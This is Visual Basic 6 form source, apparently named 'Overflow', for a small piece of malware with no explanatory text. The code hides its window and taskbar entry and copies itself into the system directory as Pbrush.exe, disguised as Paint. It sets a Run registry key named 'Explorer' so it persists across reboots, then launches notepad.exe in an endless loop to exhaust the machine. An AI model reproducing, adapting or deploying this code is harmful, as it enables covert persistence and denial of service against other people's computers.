   VERSION 5.00
   Begin VB.Form Form1
      BorderStyle     =   0  'None
      Caption         =   "Form1"
      ClientHeight    =   90
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   90
      Icon            =   "Overflow.frx":0000
      LinkTopic       =   "Form1"
      ScaleHeight     =   90
      ScaleWidth      =   90
      ShowInTaskbar   =   0   'False
      StartUpPosition =   2  'CenterScreen
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Const HKEY_LOCAL_MACHINE = &H80000002
   Private Const REG_SZ = 1
   Private Const ERROR_SUCCESS = 0&
   Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
   Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
   Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Dim sysDir As String
   Dim StrValue As String
   Dim StrPath As String
   Dim hCurKey As Long
   Dim lRegResult As Long
   Dim StrData As String
   Dim hKey As Long


   Private Sub Form_Load()
   Me.Hide
   App.TaskVisible = False
   I = 1
   sysDir = Space(500)
   sysDir = Left(sysDir, GetSystemDirectory(sysDir, Len(sysDir)))
   hj = Dir(sysDir & "\Pbrush.exe")
   If hj = "" Then
     hKey = HKEY_LOCAL_MACHINE
     StrValue = "Explorer"
     StrPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
     StrData = sysDir & "\Pbrush.exe"
     lRegResult = RegCreateKey(hKey, StrPath, hCurKey)
     lRegResult = RegSetValueEx(hCurKey, StrValue, 0, REG_SZ, ByVal StrData, Len(StrData))
     If Right(App.Path, 1) = "\" Then
       FileCopy App.Path & "Pbrush.exe", sysDir & "\Pbrush.exe"
     Else
       FileCopy App.Path & "\Pbrush.exe", sysDir & "\Pbrush.exe"
     End If
   End If
   k2 = "c:\windows\notepad.exe"
   f = Dir(k2)
   If f <> "" Then
     Do
       Call Shell(k2)
       I = 1
     Loop Until I = 0
   End If
   End Sub
